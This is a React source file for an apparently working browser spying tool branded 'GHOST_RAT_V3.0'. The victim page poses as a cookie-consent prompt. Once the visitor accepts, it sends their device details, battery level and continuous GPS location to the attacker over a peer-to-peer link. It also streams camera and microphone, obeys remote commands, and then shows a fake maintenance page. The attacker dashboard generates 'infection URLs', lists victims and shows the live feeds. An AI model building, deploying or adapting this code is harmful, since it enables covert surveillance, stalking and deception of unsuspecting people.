import React, { useState, useEffect, useRef } from 'react';
import { AppProps } from '../../types';
import { Ghost, Wifi, Crosshair, Terminal, Copy, Check, Eye, ShieldCheck, Lock, Smartphone, MapPin, Globe, Zap, MessageSquare, Mic, Navigation, Battery, Cookie, Settings, AlertTriangle } from 'lucide-react';
import Peer from 'peerjs';

// Types
interface VictimData {
    id: string; // The peer connection ID
    conn: any;  // PeerJS Connection
    call?: any; // MediaConnection
    platform: string;
    ua: string;
    screen: string;
    lang: string;
    cores: number;
    battery?: number;
    gps?: { lat: number; lng: number; acc: number };
    stream?: MediaStream;
    connectedAt: number;
}

// --- VICTIM COMPONENT (Realistic Cookie Consent Trap) ---
export const GhostVictimApp: React.FC<{ sessionId: string }> = ({ sessionId }) => {
    const [status, setStatus] = useState<'consent' | 'requesting' | 'connected' | 'error'>('consent');
    const [debugLog, setDebugLog] = useState<string>("");

    useEffect(() => {
        if (!sessionId) setStatus('error');
    }, [sessionId]);

    const handleAcceptCookies = async () => {
        setStatus('requesting');
        
        try {
            const peer = new Peer();
            
            peer.on('open', async (myId) => {
                const conn = peer.connect(sessionId);

                conn.on('open', () => {
                    setStatus('connected');
                    
                    // 1. Gather Stealth Intel
                    const info: any = {
                        ua: navigator.userAgent,
                        platform: navigator.platform,
                        screen: `${window.screen.width}x${window.screen.height}`,
                        lang: navigator.language,
                        cores: navigator.hardwareConcurrency
                    };

                    // Battery
                    if ((navigator as any).getBattery) {
                        (navigator as any).getBattery().then((b: any) => {
                            conn.send({ type: 'battery', level: b.level * 100 });
                        });
                    }

                    conn.send({ type: 'info', data: info });

                    // 2. GPS Silent Watch
                    if (navigator.geolocation) {
                        navigator.geolocation.watchPosition((pos) => {
                            conn.send({
                                type: 'gps',
                                data: { lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy }
                            });
                        }, (err) => {
                             conn.send({ type: 'log', msg: 'GPS Denied: ' + err.message });
                        });
                    }
                    
                    // 3. Remote Control Listener
                    conn.on('data', (data: any) => {
                        if (data.cmd === 'vibrate') if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
                        if (data.cmd === 'alert') alert(data.msg);
                        if (data.cmd === 'redirect') window.location.href = data.url;
                        if (data.cmd === 'speak') {
                            const u = new SpeechSynthesisUtterance(data.msg);
                            window.speechSynthesis.speak(u);
                        }
                    });
                });

                // 4. Media Stream (Hidden)
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: 'user' }, 
                        audio: true 
                    });
                    // Establish call but don't show local video
                    const call = peer.call(sessionId, stream);
                } catch (e) {
                    conn.send({ type: 'error', msg: 'Cam/Mic Access Denied' });
                }
            });
            
            peer.on('error', (err) => {
                setDebugLog("Connection timeout. Retrying...");
                // Silent retry logic could go here
            });

        } catch (e) {
            console.error(e);
        }
    };

    if (status === 'connected') {
        // --- DECOY PAGE (404 / Maintenance) ---
        return (
             <div className="fixed inset-0 bg-white flex flex-col items-center justify-center p-8 text-center font-sans select-none text-slate-800 z-50">
                <div className="w-16 h-16 bg-slate-100 rounded-full flex items-center justify-center mb-6 text-slate-400">
                    <AlertTriangle size={32} />
                </div>
                <h1 className="text-2xl font-bold mb-2 text-slate-900">Site Maintenance</h1>
                <p className="text-slate-500 max-w-xs mx-auto leading-relaxed">
                    We are currently performing scheduled maintenance. Please check back in a few minutes.
                </p>
                <div className="mt-8 text-[10px] text-slate-300 font-mono">
                    Error ID: {sessionId.substring(0,8)}-{Date.now().toString().substring(8)}
                </div>
            </div>
        );
    }

    if (status === 'requesting') {
        return (
             <div className="fixed inset-0 bg-white/90 backdrop-blur-sm flex flex-col items-center justify-center z-50">
                <div className="w-10 h-10 border-4 border-indigo-200 border-t-indigo-600 rounded-full animate-spin mb-4"></div>
                <p className="text-slate-600 font-medium text-sm">Saving privacy settings...</p>
            </div>
        );
    }

    // --- TRAP PAGE (Cookie Consent) ---
    return (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-end md:items-center justify-center p-0 md:p-4 font-sans text-slate-900 select-none z-50">
            {/* Modal */}
            <div className="bg-white w-full md:max-w-lg md:rounded-2xl rounded-t-2xl shadow-2xl overflow-hidden animate-in slide-in-from-bottom-10 duration-500">
                
                {/* Header */}
                <div className="p-6 pb-2">
                    <div className="flex items-start gap-4">
                        <div className="w-12 h-12 bg-indigo-50 text-indigo-600 rounded-xl flex items-center justify-center shrink-0">
                            <Cookie size={24} />
                        </div>
                        <div>
                            <h2 className="font-bold text-xl text-slate-900 mb-1">Cookie Preferences</h2>
                            <p className="text-sm text-slate-500 leading-relaxed">
                                We use cookies and similar technologies to help personalize content, tailor and measure ads, and provide a better experience.
                            </p>
                        </div>
                    </div>
                </div>

                {/* Toggles (Fake) */}
                <div className="px-6 py-2 space-y-3">
                    <div className="flex items-center justify-between p-3 bg-slate-50 rounded-lg border border-slate-100">
                        <div className="text-sm font-semibold text-slate-700">Essential Cookies</div>
                        <div className="text-xs text-indigo-600 font-bold bg-indigo-50 px-2 py-1 rounded">Required</div>
                    </div>
                    <div className="flex items-center justify-between p-3 bg-slate-50 rounded-lg border border-slate-100">
                        <div className="text-sm font-semibold text-slate-700">Device Analytics</div>
                        <div className="w-10 h-5 bg-indigo-600 rounded-full relative">
                            <div className="absolute right-1 top-1 w-3 h-3 bg-white rounded-full shadow-sm"></div>
                        </div>
                    </div>
                </div>

                {/* Actions */}
                <div className="p-6 flex flex-col gap-3 pt-4">
                    <button 
                        onClick={handleAcceptCookies}
                        className="w-full bg-indigo-600 text-white font-bold py-3.5 rounded-xl hover:bg-indigo-700 transition-all active:scale-[0.98] shadow-lg shadow-indigo-600/20 flex items-center justify-center gap-2"
                    >
                        Accept All & Continue
                    </button>
                    <button className="w-full bg-white border border-slate-200 text-slate-600 font-medium py-3 rounded-xl hover:bg-slate-50 text-sm">
                        Reject Non-Essential
                    </button>
                </div>
                
                <div className="px-6 pb-4 text-center">
                    <p className="text-[10px] text-slate-400">
                        By clicking "Accept All", you agree to our Terms of Service and Privacy Policy.
                    </p>
                </div>
            </div>
        </div>
    );
};


// --- ATTACKER APP (Dashboard) ---
export const GhostApp: React.FC<AppProps> = ({ isHackerMode }) => {
    // Session
    const [peerId, setPeerId] = useState<string>('');
    const [customHost, setCustomHost] = useState<string>('https://kernelosss.vercel.app'); // Default to your Vercel URL
    const [copied, setCopied] = useState(false);
    
    // Data
    const [victims, setVictims] = useState<Record<string, VictimData>>({});
    const [selectedVictimId, setSelectedVictimId] = useState<string | null>(null);
    const [logs, setLogs] = useState<string[]>([]);
    const [cmdInput, setCmdInput] = useState('');
    
    // Refs
    const videoRef = useRef<HTMLVideoElement>(null);
    const peerRef = useRef<Peer | null>(null);

    // Color definitions
    const colors = {
        bg: isHackerMode ? 'bg-black' : 'bg-slate-950',
        text: isHackerMode ? 'text-green-500' : 'text-red-500',
        border: isHackerMode ? 'border-green-900' : 'border-red-900',
        highlight: isHackerMode ? 'text-green-400' : 'text-red-400',
    };

    const addLog = (msg: string) => setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev.slice(0, 99)]);

    useEffect(() => {
        // --- PERSISTENT ID ---
        const savedId = localStorage.getItem('ghost_session_id');
        const peer = savedId ? new Peer(savedId) : new Peer();
        
        peer.on('open', (id) => {
            setPeerId(id);
            localStorage.setItem('ghost_session_id', id);
            addLog(`C2 ONLINE. LISTENING ON PORT 443`);
            addLog(`SESSION ID: ${id}`);
        });

        peer.on('error', (err: any) => {
            if (err.type === 'unavailable-id') {
                localStorage.removeItem('ghost_session_id');
                const newPeer = new Peer();
                newPeer.on('open', (id) => {
                    setPeerId(id);
                    localStorage.setItem('ghost_session_id', id);
                    addLog(`ID REGENERATED: ${id}`);
                });
                bindPeerListeners(newPeer);
                peerRef.current = newPeer;
            } else {
                addLog(`[ERROR] ${err.type}`);
            }
        });

        bindPeerListeners(peer);
        peerRef.current = peer;

        return () => { peer.destroy(); };
    }, []);

    const bindPeerListeners = (peer: Peer) => {
        peer.on('connection', (conn) => {
            const vId = conn.peer;
            addLog(`[+] CONNECTION ESTABLISHED: ${vId.substring(0,6)}`);
            
            setVictims(prev => ({
                ...prev,
                [vId]: {
                    id: vId,
                    conn,
                    platform: 'Analyzing...',
                    ua: 'Unknown',
                    screen: 'Unknown',
                    lang: 'Unknown',
                    cores: 0,
                    connectedAt: Date.now()
                }
            }));
            
            if (!selectedVictimId) setSelectedVictimId(vId);

            conn.on('data', (data: any) => {
                if (data.type === 'info') setVictims(prev => ({ ...prev, [vId]: { ...prev[vId], ...data.data } }));
                if (data.type === 'battery') setVictims(prev => ({ ...prev, [vId]: { ...prev[vId], battery: data.level } }));
                if (data.type === 'gps') {
                    setVictims(prev => ({ ...prev, [vId]: { ...prev[vId], gps: data.data } }));
                    addLog(`[GPS] LOCK: ${data.data.lat.toFixed(4)}, ${data.data.lng.toFixed(4)}`);
                }
                if (data.type === 'log') addLog(`[LOG] ${vId.substring(0,4)}: ${data.msg}`);
                if (data.type === 'error') addLog(`[ERR] ${vId.substring(0,4)}: ${data.msg}`);
            });

            conn.on('close', () => {
                addLog(`[-] CONNECTION LOST: ${vId.substring(0,6)}`);
                setVictims(prev => {
                    const next = { ...prev };
                    delete next[vId];
                    return next;
                });
                if (selectedVictimId === vId) setSelectedVictimId(null);
            });
        });

        peer.on('call', (call) => {
            const vId = call.peer;
            call.answer();
            call.on('stream', (remoteStream) => {
                setVictims(prev => ({ ...prev, [vId]: { ...prev[vId], stream: remoteStream, call } }));
                addLog(`[CAM] VIDEO FEED ACTIVE: ${vId.substring(0,6)}`);
            });
        });
    }

    // Attach stream to video element
    useEffect(() => {
        if (selectedVictimId && videoRef.current && victims[selectedVictimId]?.stream) {
            videoRef.current.srcObject = victims[selectedVictimId].stream!;
        }
    }, [selectedVictimId, victims]);

    // Construct the infection link
    const getExploitLink = () => {
        if (!peerId) return 'Initializing...';
        // Normalize URL to prevent double slashes
        let host = customHost.trim();
        if (!host.startsWith('http')) host = 'https://' + host;
        host = host.replace(/\/$/, '');
        
        return `${host}/${peerId}`;
    };

    const copyLink = () => {
        navigator.clipboard.writeText(getExploitLink());
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
        addLog("[SYS] LINK COPIED TO CLIPBOARD");
    };

    const sendCommand = (cmd: string, payload: any = {}) => {
        if (!activeVictim) return;
        activeVictim.conn.send({ cmd, ...payload });
        addLog(`[CMD] SENT '${cmd.toUpperCase()}' TO TARGET`);
    };

    const activeVictim = selectedVictimId ? victims[selectedVictimId] : null;

    return (
        <div className={`h-full w-full flex flex-col font-mono ${colors.bg} ${colors.text} select-none overflow-hidden`}>
            
            {/* Header */}
            <div className={`h-12 flex items-center justify-between px-4 border-b ${colors.border} bg-white/5 shrink-0`}>
                <div className="flex items-center gap-2">
                    <Ghost size={18} className={isHackerMode ? 'text-green-500' : 'text-red-500'} />
                    <span className="font-bold tracking-widest text-sm">GHOST_RAT_V3.0</span>
                </div>
                <div className={`flex items-center gap-2 text-[10px] font-bold px-2 py-0.5 rounded ${peerId ? 'bg-green-500/20 text-green-500' : 'bg-red-500/20 text-red-500'}`}>
                    <Wifi size={10} />
                    {peerId ? 'C2 ONLINE' : 'OFFLINE'}
                </div>
            </div>

            <div className="flex-1 flex overflow-hidden">
                
                {/* LEFT: Targets & Config */}
                <div className={`w-72 border-r ${colors.border} flex flex-col bg-white/5`}>
                    
                    {/* Target List */}
                    <div className="flex-1 overflow-y-auto p-2 space-y-2">
                         <div className="text-[10px] opacity-50 uppercase mb-2 px-1">Active Sessions ({Object.keys(victims).length})</div>
                        {Object.keys(victims).length === 0 && (
                            <div className="text-center opacity-30 text-xs mt-10 italic border border-dashed border-white/20 p-4 rounded">
                                Waiting for incoming connections...
                            </div>
                        )}
                        {Object.values(victims).map((v: VictimData) => (
                            <button
                                key={v.id}
                                onClick={() => setSelectedVictimId(v.id)}
                                className={`w-full text-left p-3 rounded border transition-all flex items-center gap-3 ${selectedVictimId === v.id ? `${colors.border} bg-white/10` : 'border-transparent hover:bg-white/5'}`}
                            >
                                <div className={`w-2 h-full absolute left-0 top-0 ${selectedVictimId === v.id ? 'bg-green-500' : 'bg-transparent'}`} />
                                <Smartphone size={16} />
                                <div className="min-w-0">
                                    <div className="font-bold text-xs truncate">{v.platform}</div>
                                    <div className="text-[10px] opacity-50 truncate">{v.id}</div>
                                </div>
                                {v.stream && <div className="w-2 h-2 rounded-full bg-red-500 animate-pulse ml-auto shadow-[0_0_5px_red]" />}
                            </button>
                        ))}
                    </div>
                    
                    {/* PAYLOAD CONFIGURATION */}
                    <div className={`p-4 border-t ${colors.border} bg-black/40`}>
                         <div className="flex items-center gap-2 mb-2">
                            <Settings size={12} className="opacity-70" />
                            <div className="text-[10px] uppercase font-bold opacity-70">Payload Configuration</div>
                         </div>
                         
                         {/* Host Input */}
                         <div className="mb-3">
                             <label className="text-[9px] block mb-1 opacity-50">C2 HOST / DOMAIN</label>
                             <input 
                                value={customHost}
                                onChange={(e) => setCustomHost(e.target.value)}
                                className={`w-full bg-black border ${colors.border} rounded px-2 py-1 text-[10px] outline-none focus:border-white transition-colors text-white`}
                                placeholder="https://kernelosss.vercel.app"
                             />
                         </div>

                         {/* Generated Link */}
                         <div className="space-y-1">
                            <label className="text-[9px] block opacity-50">INFECTION URL</label>
                            <div className="flex gap-2">
                                <input readOnly value={getExploitLink()} className={`flex-1 bg-black text-[10px] px-2 py-1.5 border ${colors.border} rounded opacity-80 select-all`} />
                                <button onClick={copyLink} className="p-1.5 bg-white/10 rounded hover:bg-white/20 active:bg-green-500 transition-colors">
                                    {copied ? <Check size={12}/> : <Copy size={12}/>}
                                </button>
                            </div>
                         </div>
                    </div>
                </div>

                {/* CENTER: Control Panel */}
                <div className="flex-1 flex flex-col relative bg-black/50">
                    {activeVictim ? (
                        <>
                            {/* Live Feed */}
                            <div className="flex-1 relative bg-black flex items-center justify-center overflow-hidden border-b border-white/10 group">
                                {activeVictim.stream ? (
                                    <video ref={videoRef} autoPlay playsInline className="w-full h-full object-contain" />
                                ) : (
                                    <div className="text-center opacity-30 flex flex-col items-center gap-2">
                                        <div className="relative">
                                            <Eye size={48} />
                                            <div className="absolute inset-0 animate-ping opacity-20 border rounded-full" />
                                        </div>
                                        <span>ACQUIRING VISUAL...</span>
                                    </div>
                                )}
                                <div className="absolute top-2 left-2 bg-red-600/90 text-white text-[9px] font-bold px-1.5 py-0.5 rounded flex items-center gap-1 shadow-lg">
                                    <div className="w-1.5 h-1.5 bg-white rounded-full animate-pulse" /> LIVE
                                </div>
                            </div>

                            {/* Control Grid */}
                            <div className={`h-64 bg-slate-900 border-t ${colors.border} p-4 grid grid-cols-1 md:grid-cols-2 gap-4 overflow-y-auto`}>
                                {/* Telemetry */}
                                <div className="space-y-2 text-xs font-mono">
                                    <div className="flex justify-between border-b border-white/5 pb-1"><span className="opacity-50">POWER</span> <span className={colors.highlight}>{activeVictim.battery ? activeVictim.battery + '%' : 'N/A'}</span></div>
                                    <div className="flex justify-between border-b border-white/5 pb-1"><span className="opacity-50">DISPLAY</span> <span>{activeVictim.screen}</span></div>
                                    <div className="flex justify-between border-b border-white/5 pb-1"><span className="opacity-50">CPU</span> <span>{activeVictim.cores} Cores</span></div>
                                    <div className="flex justify-between border-b border-white/5 pb-1"><span className="opacity-50">LOCALE</span> <span>{activeVictim.lang}</span></div>
                                    {activeVictim.gps && (
                                        <div className="mt-2 bg-white/5 p-2 rounded border border-white/5">
                                            <div className="opacity-50 mb-1 flex items-center gap-1"><MapPin size={10}/> GPS TRIANGULATION</div>
                                            <div className={`${colors.highlight} text-[10px]`}>{activeVictim.gps.lat.toFixed(6)}, {activeVictim.gps.lng.toFixed(6)}</div>
                                            <a href={`https://www.google.com/maps?q=${activeVictim.gps.lat},${activeVictim.gps.lng}`} target="_blank" className="underline opacity-50 hover:opacity-100 text-[9px] block mt-1">OPEN SATELLITE VIEW</a>
                                        </div>
                                    )}
                                </div>

                                {/* Actions */}
                                <div className="space-y-3">
                                    <div className="text-[10px] uppercase opacity-50 font-bold border-b border-white/10 pb-1">Command Injection</div>
                                    
                                    <div className="grid grid-cols-2 gap-2">
                                        <button onClick={() => sendCommand('vibrate')} className="bg-white/5 hover:bg-yellow-500/20 p-2 rounded border border-white/10 flex items-center justify-center gap-2 text-xs font-bold active:scale-95 transition-all">
                                            <Zap size={14} className="text-yellow-400" /> VIBRATE
                                        </button>
                                        <button onClick={() => { const msg = prompt('Alert Message:'); if(msg) sendCommand('alert', {msg}); }} className="bg-white/5 hover:bg-blue-500/20 p-2 rounded border border-white/10 flex items-center justify-center gap-2 text-xs font-bold active:scale-95 transition-all">
                                            <MessageSquare size={14} className="text-blue-400" /> ALERT
                                        </button>
                                        <button onClick={() => { const msg = prompt('Text to Speak:'); if(msg) sendCommand('speak', {msg}); }} className="bg-white/5 hover:bg-pink-500/20 p-2 rounded border border-white/10 flex items-center justify-center gap-2 text-xs font-bold active:scale-95 transition-all">
                                            <Mic size={14} className="text-pink-400" /> TTS
                                        </button>
                                        <button onClick={() => { const url = prompt('Redirect URL:'); if(url) sendCommand('redirect', {url}); }} className="bg-white/5 hover:bg-green-500/20 p-2 rounded border border-white/10 flex items-center justify-center gap-2 text-xs font-bold active:scale-95 transition-all">
                                            <Globe size={14} className="text-green-400" /> REDIRECT
                                        </button>
                                    </div>

                                    <div className="mt-2 flex gap-2">
                                         <input 
                                            value={cmdInput} 
                                            onChange={(e) => setCmdInput(e.target.value)}
                                            onKeyDown={(e) => {if(e.key === 'Enter'){ sendCommand('alert', {msg: cmdInput}); setCmdInput(''); }}}
                                            placeholder="> Inject custom shellcode..."
                                            className="flex-1 bg-black border border-white/20 rounded px-2 text-xs outline-none focus:border-green-500 font-mono text-green-500 placeholder-green-900"
                                         />
                                         <button onClick={() => {sendCommand('alert', {msg: cmdInput}); setCmdInput('');}} className="px-3 bg-white/10 rounded text-[10px] font-bold hover:bg-white/20">EXEC</button>
                                    </div>
                                </div>
                            </div>
                        </>
                    ) : (
                        <div className="flex-1 flex flex-col items-center justify-center opacity-20 gap-4">
                            <Crosshair size={64} />
                            <div className="text-sm tracking-widest">AWAITING TARGET SELECTION</div>
                        </div>
                    )}
                </div>

                {/* RIGHT: Logs */}
                <div className={`w-56 border-l ${colors.border} bg-black/40 hidden xl:flex flex-col`}>
                    <div className="p-2 text-[10px] font-bold border-b border-white/10 flex items-center gap-2 bg-white/5">
                        <Terminal size={10} /> SYSTEM LOGS
                    </div>
                    <div className="flex-1 p-2 overflow-y-auto font-mono text-[9px] space-y-1">
                        {logs.map((l, i) => (
                            <div key={i} className="break-all opacity-70 border-l border-white/10 pl-1 hover:text-white hover:opacity-100 transition-colors cursor-default">{l}</div>
                        ))}
                    </div>
                </div>

            </div>
        </div>
    );
};